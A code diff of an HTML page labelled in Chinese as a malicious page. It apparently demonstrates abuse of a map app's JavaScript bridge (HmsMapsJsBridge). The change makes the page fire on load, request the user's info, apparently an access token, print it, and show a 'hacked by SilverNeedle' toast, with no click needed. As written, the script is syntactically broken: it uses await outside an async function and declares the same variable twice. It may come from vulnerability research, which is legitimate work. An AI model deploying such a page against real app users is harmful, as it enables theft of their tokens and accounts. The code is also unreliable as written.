@@ -23,20 +23,28 @@
     </style>
 </head>
 <body>
-    <h1 id="text">恶意页面</h1>
+    <h1 id="text">恶意页面 1</h1>
     <button onclick="getAT()">点击我获取用户AT</button>
     <button onclick="toast()">点击我发送消息</button>
     <script>
-        function getAT() {
-            // document.getElementById("text").innerText = "文本已被修改！";
-            let str = "{'type':'getUserInfo', 'msgId':10086}";
-            let ret = await window.HmsMapsJsBridge.postMessage(str);
+        window.onload = function() {
+            let str1 = "{'type':'getUserInfo', 'msgId':10086}";
+            let ret = await window.HmsMapsJsBridge.postMessage(str1);
             document.getElementById("text").innerText = ret;
+            let str2 = "{'type':'toast', 'msgId':10086, 'data':{'message':'hacked by SilverNeedle😄'}}";
+            let ret = await window.HmsMapsJsBridge.postMessage(str2);
         }
-        function toast() {
-            let str = "{'type':'toast', 'msgId':10086, 'data':{'message':'hacked by SilverNeedle😄'}}";
-            let ret = await window.HmsMapsJsBridge.postMessage(str);
-        }
+        // function getAT() {
+        //     // document.getElementById("text").innerText = "文本已被修改！";
+        //     let str = "{'type':'getUserInfo', 'msgId':10086}";
+        //     let ret = await window.HmsMapsJsBridge.postMessage(str);
+        //     document.getElementById("text").innerText = ret;
+        // }
+        // function toast() {
+        //     let str = "{'type':'toast', 'msgId':10086, 'data':{'message':'hacked by SilverNeedle😄'}}";
+        //     let ret = await window.HmsMapsJsBridge.postMessage(str);
+        // }
+
 
     </script>
 </body>
